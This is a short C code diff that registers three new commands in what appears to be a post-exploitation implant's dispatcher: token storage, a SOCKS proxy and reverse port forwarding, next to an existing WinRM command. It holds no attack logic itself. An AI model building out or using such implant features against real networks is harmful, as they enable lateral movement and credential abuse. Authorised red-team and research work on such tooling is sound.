@@ -233,6 +233,15 @@ VOID register_commands(PINSTANCE inst) {
 #ifdef INCLUDE_CMD_WINRM
     _register(XSTR("winrm"), cmd_winrm);
 #endif
+#ifdef INCLUDE_CMD_TOKEN_STORE
+    _register(XSTR("token_store"), cmd_token_store);
+#endif
+#ifdef INCLUDE_SOCKS_PROXY
+    _register(XSTR("socks"), cmd_socks);
+#endif
+#ifdef INCLUDE_RPFWD
+    _register(XSTR("rportfwd"), cmd_rportfwd);
+#endif
 }
 
 VOID dispatch_command(PINSTANCE inst, const char* cmd_name, BYTE* args, DWORD args_len,
